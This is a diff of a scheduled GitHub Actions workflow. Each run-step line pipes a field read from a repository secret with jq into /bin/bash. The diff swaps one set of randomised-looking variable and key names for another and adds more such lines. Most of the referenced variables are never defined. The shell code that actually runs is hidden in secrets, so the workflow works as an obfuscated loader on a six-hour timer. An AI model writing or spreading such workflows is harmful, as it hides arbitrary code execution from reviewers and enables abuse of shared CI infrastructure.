@@ -1,25 +1,31 @@
 name: zhangguifan2189
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '45 0/6 * * *'
+    - cron: '3 0/6 * * *'
 
-jobs:  # 14330
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: zhangguifan2189
         env:
-          otva89367: ${{ secrets.otva89367 }}
+          oxxft926: ${{ secrets.oxxft926 }}
         run: |
-          echo $otva89367 | jq -r .xegjp15 | /bin/bash
-          echo $sxa3549 | jq -r .u66210 | /bin/bash
-          echo $e9655 | jq -r .hojz9 | /bin/bash
-          echo $oik48 | jq -r .jqrt00 | /bin/bash
-          echo $qi3 | jq -r .u9 | /bin/bash
-          echo $ho4170 | jq -r .p31763 | /bin/bash
-          echo $g6 | jq -r .ddwd1 | /bin/bash
-          echo $q46 | jq -r .idswq0553 | /bin/bash
+          echo $oxxft926 | jq -r .bewaw114 | /bin/bash
+          echo $ksu2 | jq -r .izin2 | /bin/bash
+          echo $fzs1 | jq -r .a60 | /bin/bash
+          echo $p631 | jq -r .pgnuk83 | /bin/bash
+          echo $sjm981 | jq -r .rox90 | /bin/bash
+          echo $zivi99 | jq -r .oxyp30569 | /bin/bash
+          echo $mc31 | jq -r .lojj540 | /bin/bash
+          echo $xxln9 | jq -r .ubgu96 | /bin/bash
+          echo $inxrg969 | jq -r .mq148 | /bin/bash
+          echo $l4997 | jq -r .bxh43803 | /bin/bash
+          echo $re816 | jq -r .g69 | /bin/bash
+          echo $g935 | jq -r .jdjse462 | /bin/bash
+          echo $w89 | jq -r .dve61758 | /bin/bash
+          echo $jy8932 | jq -r .a71916 | /bin/bash
 
